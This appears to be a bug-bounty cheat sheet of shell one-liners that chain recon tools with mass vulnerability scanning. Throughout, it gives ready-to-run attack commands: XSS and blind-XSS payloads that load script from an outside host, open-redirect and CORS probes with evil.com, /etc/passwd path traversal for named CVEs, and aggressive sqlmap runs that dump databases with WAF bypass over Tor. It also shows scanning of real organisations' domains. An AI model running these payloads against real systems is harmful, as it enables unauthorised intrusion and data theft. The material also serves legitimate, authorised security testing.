xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

###  Using shodan & Nuclei

- [Explained command]

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

###  Open Redirect test using gf.

- [Explained command]

echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".

- [Explained command]

```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
###  Using Chaos to jaeles "How did I find a critical today?.

- [Explained command]

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

###  Using shodan to jaeles

- [Explained command]

```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

###  Search to files using assetfinder and ffuf

- [Explained command]

```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```

###  HTTPX using new mode location and injection XSS using qsreplace.

- [Explained command]

```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```

###  Grap internal juicy paths and do requests to them.

- [Explained command]

```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```

###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.

- [Explained command]

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

###  Using to findomain to SQLINJECTION.

- [Explained command]

```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

###  Jaeles scan to bugbounty targets.

- [Explained command]

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```

###  JLDC domain search subdomain, using rush and jaeles.

- [Explained command]

```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

###  Chaos to search subdomains check cloudflareip scan port.

- [Explained command]

```bash
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
###  Search JS to domains file.

- [Explained command]

```bash
cat FILE TO TARGET | httpx -silent | subjs | anew
```

###  Search JS using assetfinder, rush and hakrawler.

- [Explained command]

```bash
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```

###  Search to CORS using assetfinder and rush

- [Explained command]

```bash
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"'
```

###  Search to js using hakrawler and rush & unew

- [Explained command]

```bash
cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```

###  XARGS to dirsearch brute force.

- [Explained command]

```bash
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js' 
```

###  Assetfinder to run massdns.

- [Explained command]

```bash
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
```

###  Extract path to js

- [Explained command]

```bash
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u 
```

###  Find subdomains and Secrets with jsubfinder

- [Explained command]

```bash
cat subdomsains.txt | httpx --silent | jsubfinder search -s
```

###  Search domains to Range-IPS.

- [Explained command]

```bash
cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew 
```

###  Search new's domains using dnsgen.

- [Explained command]

```bash
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain
```

###  List ips, domain extract, using amass + wordlist

- [Explained command]

```bash
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
```
###  Search domains using amass and search vul to nuclei.

- [Explained command]

```bash
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
```

###  Verify to cert using openssl.

- [Explained command]

```bash
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <(
    openssl x509 -noout -text -in <(
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \
            -connect hackerone.com:443 ) )
```


###  Search domains using openssl to cert.

- [Explained command]

```bash
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
```


###  Search domains over IP/ASN using Hurricane Electric.

- [Explained command]

```bash
nslookup hackerone.com | awk '/Address: / {print $2}' | hednsextractor -silent -only-domains | httpx -silent -title -tech-detect -status-code 
```

###  Search domains using Hudson Rock's cybercrime intelligence data

- [Explained command]

```bash
https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=tesla.com 
```

###  Mass hunting exposed git from a ASN/IP with hednsextractor.

- [Explained command]

```bash
hednsextractor -target "your target" -silent | httpx -path /.git/config -status-code -ms 200 -silent
```

```
#Web Recon Discovery
```
subfinder -d TARGET.com -o subdomain.txt | httprobe -c 50 -t 100 | wfuzz -w worlist.txt -c -u 'http://FUZZ.TARGET.COM/' -H 'X-Forwarded-For: FUZZ' -v --hc 404 | grep -e "code-200" | awk '{print $5}' | grep -E '.php|.asp|.jsp' | hakcheckurl -verbose | grep -E 'high|medium' | sort -u >vuln_url.txt
		```
## OneLiner

```
waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```

```
subfinder -dL domains.txt | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
```

────────────────────────────────────────────────────────────────────────



# NGINX Path Traversal

## Installation Requirements
1. HTTPX : https://github.com/projectdiscovery/httpx


## OneLiner
```
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```

────────────────────────────────────────────────────────────────────────



# Subdomain Takeover

## Installation Requirements
1. Subfinder    : https://github.com/projectdiscovery/subfinder 
2. Assetfinder  : https://github.com/tomnomnom/assetfinder
3. Amass        : https://github.com/OWASP/Amass
4. Subjack      : https://github.com/haccer/subjack


## OneLiner
```
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
```

────────────────────────────────────────────────────────────────────────



# Extract URLs from Source Code

## OneLiner
```
curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
```


────────────────────────────────────────────────────────────────────────



# XSS (Cross-Site Scripting)

## Installation Requirements
1. Katana       : https://github.com/projectdiscovery/katana
2. Dalfox       : https://github.com/hahwul/dalfox
3. Waybackurls  : https://github.com/tomnomnom/waybackurls
4. GF           : https://github.com/tomnomnom/gf
5. Dalfox       : https://github.com/hahwul/dalfox
6. HTTPX      : https://github.com/projectdiscovery/httpx


## OneLiner
```
echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
```

```
waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
```

```
cat http://target.com | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in
```

### Blind XSS Mass Hunting

```
cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
```
────────────────────────────────────────────────────────────────────────



# Find Endpoints in JS

## Installation Requirements
1. Katana    : https://github.com/projectdiscovery/katana
2. Anew      : https://github.com/tomnomnom/anew


## OneLiner
```
katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
```

────────────────────────────────────────────────────────────────────────

# OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
```

────────────────────────────────────────────────────────────────────────

# cPanel CVE-2023-29489 XSS One-Liner

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
```

────────────────────────────────────────────────────────────────────────

# WP-Config Oneliner

## Installation Requirements
1. Subfinder  : https://github.com/projectdiscovery/subfinder
2. HTTPX      : https://github.com/projectdiscovery/httpx

## OneLiner
```
subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
```

────────────────────────────────────────────────────────────────────────

# JS Secret Finder Oneliner

## Installation Requirements
1. Gau         : https://github.com/lc/gau
2. HTTPX       : https://github.com/projectdiscovery/httpx
3. Nuclei      : https://github.com/projectdiscovery/nuclei

## OneLiner
```
echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
```

────────────────────────────────────────────────────────────────────────

# Memory dump and env disclosure

## Installation Requirements
1. Shodan      : https://www.shodan.io

## OneLiner
```
shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}'
```

────────────────────────────────────────────────────────────────────────

# Easiest Information Disclosure in JSON body

## Installation Requirements
1. Waybackurls  : https://github.com/tomnomnom/waybackurls
2. HTTPX       : https://github.com/projectdiscovery/httpx

## OneLiner
```
cat subdomains.txt | waybackurls | httpx -mc 200 -ct | grep application/json
```

────────────────────────────────────────────────────────────────────────

# Fuzz with 127.0.0.1 as Host header 

## Installation Requirements
1. FFUF  : https://github.com/ffuf/ffuf

## OneLiner
```
ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs <regular_content_length>
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000

## OneLiner
```
cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
```

────────────────────────────────────────────────────────────────────────

# Get Favicon Hash of your target Domain

## OneLiner
```
curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c 'import mmh3, sys, codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-22515 One Liner Confluence Data Center & Server: Privilege Escalation

## OneLiner
```
cat file.txt | while read host do; do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "Vulnerable"; done
```

────────────────────────────────────────────────────────────────────────

# CVE-2023-22518 - Improper Authorization Vulnerability in Confluence Data Center and Server

## OneLiner
```
subfinder -d TARGET.COM -silent | httpx -silent | nuclei -t CVE-2023-22518.yaml
```

────────────────────────────────────────────────────────────────────────

# Extract Sensitive Informations on /auth.json Endpoint.

## OneLiner
```
subfinder -d TARGET.COM | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
```

────────────────────────────────────────────────────────────────────────

# Use xargs with gau to scan bulk domains without losing speed .

## Installation Requirements
1. GAU         : https://github.com/lc/gau

## OneLiner
```
xargs -a alive.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a gau.txt
```

────────────────────────────────────────────────────────────────────────

# Blind XSS In X-Forwarded-For Header.

## Installation Requirements
1. BXSS         : https://github.com/ethicalhackingplayground/bxss
2. GAU          : https://github.com/lc/gau
3. Findomain    : https://github.com/Findomain/Findomain

## OneLiner
```
findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
```

────────────────────────────────────────────────────────────────────────

# Subdomain Enumeration with Google Tag Manager.

## OneLiner
```
curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP '"key","[a-zA-Z0-9.-]+\.[a-z]{2,}"' | awk -F'"' '{print $4}'
```

────────────────────────────────────────────────────────────────────────

# Search for Kubernetes setups in a specific organization and probe them for additional info.

## OneLiner
```
shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
```
# One-Liners for bug bounty

---------------------------
## One Line recon using pd tools
```
subfinder -d redacted.com -all | anew subs.txt; shuffledns -d redacted.com -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt; dnsx -l subs.txt -r resolvers.txt | anew resolved.txt; naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt; httpx -l ports .txt | anew alive.txt; katana -list alive.txt -silent -nc -jc -kf all -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -aff | anew urls.txt; nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | anew nuclei.txt
```
# Subdomain Enumeration
```
## Juicy Subdomains
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'

## from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 

## from Riddler.io

curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

## from RedHunt Labs Recon API
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r

## from nmap
nmap --script hostmap-crtsh.nse target.com

## from CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

## from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

## from JLDC
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

## from crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

## from ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u

## from Anubis
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"

## from ThreatCrowd
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"

## from HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

## from AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

## from Censys
censys subdomains target.com

## from subdomain center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```
--------
## LFI:
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
----------------------
## Open Redirect:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
```
----------------
## XSS:
### Knoxss mass hunting
```
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```
```
cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```
```
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
```
## ffuf json to txt output
```
cat output.json | jq | grep -o '"url": "http[^"]*"' | grep -o 'http[^"]*' | anew out.txt

```
**Search for Sensitive files from Wayback**
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
-------------------
## SQLi:
```
cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```
***Bypass WAF using TOR***
```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```
***find which host is vuln in output folder of sqlmap/ghauri***
``root@bb:~/.local/share/sqlmap/output#``
```
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```
----------------
## CORS:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## JS Files:
### Find JS Files:
```
cat target.txt | (gau || hakrawler || waybackurls || katana) | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew js.txt
```
```
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*\(text/javascript\|application/javascript\)'; then
    echo "$url"
  fi
done < urls.txt > js.txt
```
### Hidden Params in JS:
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
---------------------------
## Scan IPs
```
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```
## Shodan Cli
```
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
```
### Ffuf.json to only ffuf-url.txt
```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```
## Update golang
```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash
```

## Censys CLI
```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
## Nmap cidr to ips.txt
```
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
```
### Xray urls scan
```
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done
```  
### grep only nuclei info
```
result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
echo "$result"
```
``[sqli-error-based:oracle] [http] [critical] https://test.com/en/events/e5?utm_source=test'&utm_medium=FUZZ'``
### Download js files
```
## curl
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."

## wget
sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done
```
### Filter only html/xml content-types for xss
```
cat urls.txt | httpx -ct -silent -mc 200 -nc | grep -i -E "text/html|text/xml" | cut -d '[' -f 1 | anew xml_html.txt

## using curl
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*text/\(html\|xml\)'; then
    echo "$url"
  fi
done < urls.txt > xml_html.txt
```
### Get favicon hash
```
curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq
```

### Build wordlists from a nuclei templates
```
for i in `grep -R yaml | awk -F: '{print $1}'`; do cat $i | grep 'BaseURL}}/' | awk -F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done
```
```
//Bug Hunting methodology part 2 by Coffin :)

subfinder -d example.com -all -recursive -o subdomain.txt

cat subdomain.txt | httpx-toolkit -ports 80,443,8080, 8000, 8888 -threads 200 > subdomains_alive.txt

naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

 katana -list sub.txt -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -kf -jc -fx -ef woff, css, png, svg, jpg,
 woff2, jpeg, gif, svg -o allurls.txt
 
 
 katana -list subdomains_alive.txt -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -kf -jc -fx -ef woff, css,png,svg, jpg, woff2, jpeg, gif,svg > allurls.txt

cat subdomains_alive.txt | gau > newparms.txt

cat newparms.txt | uro filterparm.txt


cat allurls.txt | grep -E "\.js$" >> js.txt

cat js.txt | while read url; do python3   /Tools/SecretFinder/SecretFinder.py -i $url -o cli >> secret.txt; done

cat secret.txt | grep aws

cat secret.txt | grep google

cat secret.txt | grep twilio

cat secret.txt | grep Heroku

cat js.txt | nuclei -t /home/mark/nuclei-templates/http/exposures/ -c 39

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

 dirsearch -l target.txt -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx, asp, py, py, rb, rb~, php, php, bak, bkp, cache, cgi,conf, csv, html,inc, jar, js, json, jsp, jsp~, lock, log, rar, old, sql, sql.gz, http://sql.zip, sql. tar.gz,sql, swp, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, .log,.xml,.js.,.json 

